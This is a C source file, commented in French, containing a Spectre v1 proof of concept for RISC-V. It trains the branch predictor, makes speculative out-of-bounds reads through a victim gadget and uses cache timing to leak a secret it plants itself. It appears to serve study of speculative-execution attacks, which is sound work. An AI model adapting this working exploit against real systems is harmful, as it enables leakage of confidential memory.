#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include "aes.h"

// ==========================================
// PARAMÈTRES
// ==========================================
#define SECRET_MAX_LEN   64
#define SECRET_OFFSET    16         // index de départ du secret dans array1
#define ARRAY1_SIZE      256
#define FLUSH_BUF_SIZE   (1024 * 1024) // 1 MiB > L2

// ==========================================
// GLOBALS
// ==========================================
unsigned int array1_size = SECRET_OFFSET;  // borne logique (vue par victim)
uint8_t array1[ARRAY1_SIZE];
uint8_t unused1[64];
uint8_t unused2[64];
uint8_t array2[256 * 512];           // 128 KiB pour le side-channel
uint8_t flush_buf[FLUSH_BUF_SIZE];

char   secret_storage[SECRET_MAX_LEN] = "DefaultSecret";
char  *secret = secret_storage;

uint8_t temp = 0;

// ==========================================
// TIMING
// ==========================================
static inline uint64_t read_cycle(void) {
    uint64_t cycle;
    asm volatile ("rdcycle %0" : "=r"(cycle));
    return cycle;
}

__attribute__((noinline))
uint64_t measure_access_time(int k) {
    volatile uint8_t *addr = &array2[k * 512];

    asm volatile("fence rw,rw" ::: "memory");
    uint64_t start = read_cycle();
    temp &= *addr;
    asm volatile("fence rw,rw" ::: "memory");
    uint64_t end = read_cycle();

    return end - start;
}

// ==========================================
// GADGET Spectre v1 (victim)
// ==========================================
//
// if (x < array1_size)
//     value = array1[x];
//     temp &= array2[value * 512];
//
__attribute__((noinline))
void victim_function(size_t x) {
    if (x < array1_size) {
        uint8_t value = array1[x];
        size_t idx   = ((size_t)value) * 512;
        temp &= array2[idx];
    }
}

// ==========================================
// NOISE AES (optionnel)
// ==========================================
void run_aes_workload() {
    uint8_t key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
                        0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
    uint8_t in[16]  = { 0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40, 0x9f, 0x96,
                        0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93, 0x17, 0x2a };
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    for (int i = 0; i < 50; i++) AES_ECB_encrypt(&ctx, in);
}

// ==========================================
// MAIN – Spectre v1 + cache side-channel
// ==========================================
int main(int argc, char **argv) {
    // 1) Secret fourni en entrée éventuellement
    if (argc > 1) {
        strncpy(secret_storage, argv[1], SECRET_MAX_LEN - 1);
        secret_storage[SECRET_MAX_LEN - 1] = '\0';
    }
    size_t secret_len = strlen(secret);
    if (secret_len + SECRET_OFFSET >= ARRAY1_SIZE) {
        printf("Secret trop long pour le buffer ARRAY1.\n");
        return 1;
    }

    printf("Starting Spectre v1 + cache side-channel (global training)...\n");
    printf("Target Secret: %s\n", secret);

    // 2) Initialisation de array1
    for (int i = 0; i < ARRAY1_SIZE; i++) {
        array1[i] = (uint8_t)(i + 1);   // valeurs non nulles pour la partie "safe"
    }
    for (size_t i = 0; i < secret_len; i++) {
        array1[SECRET_OFFSET + i] = (uint8_t)secret[i];
    }

    // 3) Init buffers
    for (int i = 0; i < (int)sizeof(array2); i++) array2[i] = 1;
    for (size_t j = 0; j < FLUSH_BUF_SIZE; j++) flush_buf[j] = (uint8_t)j;

    char *recovered = malloc(secret_len + 1);
    if (!recovered) return 1;
    recovered[secret_len] = '\0';

    const int TRIES         = 200;     // tentatives par caractère
    const int GLOBAL_TRAIN  = 50000;  // gros entraînement du prédicteur au début

    size_t malicious_x_base = SECRET_OFFSET;

    printf("array1_size (logical) = %u\n", array1_size);
    printf("malicious_x_base = %zu (array1[malicious_x_base] = '%c')\n",
           malicious_x_base, array1[malicious_x_base]);

    // 4) ENTRAÎNEMENT GLOBAL DU PRÉDICTEUR (AVANT TOUTE FUITE)
    // On martèle victim_function avec des x valides pour que
    // la branche "if (x < array1_size)" soit prédite comme prise.
    for (int tr = 0; tr < GLOBAL_TRAIN; tr++) {
        size_t x = tr % array1_size;   // x toujours dans [0..array1_size-1]
        victim_function(x);
    }

    // 5) Boucle principale : fuite de chaque byte du secret
    for (size_t i = 0; i < secret_len; i++) {
        int scores[256] = {0};

        for (int t = 0; t < TRIES; t++) {
            // (Optionnel) bruit
            // run_aes_workload();

            // --- FLUSH CACHE ---
            for (size_t j = 0; j < FLUSH_BUF_SIZE; j += 64) {
                flush_buf[j]++;   // 1MiB de trafic mémoire
            }

            // --- ATTACK ---
            // Architecturiellement : x >= array1_size -> if false -> pas d'accès.
            // Spéculativement : le prédicteur, entraîné plus tôt, peut croire que
            // la branche est prise et exécuter le corps avec un x OOB (secret).
            size_t malicious_x = malicious_x_base + i;
            victim_function(malicious_x);

            // --- MESURE ---
            int best_idx = -1;
            uint64_t best_time = (uint64_t)-1;
            for (int k = 0; k < 256; k++) {
                uint64_t dt = measure_access_time(k);
                if (dt < best_time) {
                    best_time = dt;
                    best_idx  = k;
                }
            }
            if (best_idx >= 0) scores[best_idx]++;
        }

        // 6) Choisir le k avec le plus haut score après TRIES
        int final_best = 0;
        int max_score  = -1;
        for (int k = 0; k < 256; k++) {
            if (scores[k] > max_score) {
                max_score  = scores[k];
                final_best = k;
            }
        }

        recovered[i] = (char)final_best;
        printf("Recovered byte %zu: 0x%02x '%c' (score=%d)\n",
               i, final_best,
               (final_best >= 32 && final_best < 127) ? (char)final_best : '?',
               max_score);
    }

    printf("Recovered secret: %s\n", recovered);
    printf("Used temp: %d\n", temp);
    printf("Done.\n");

    free(recovered);
    return 0;
}
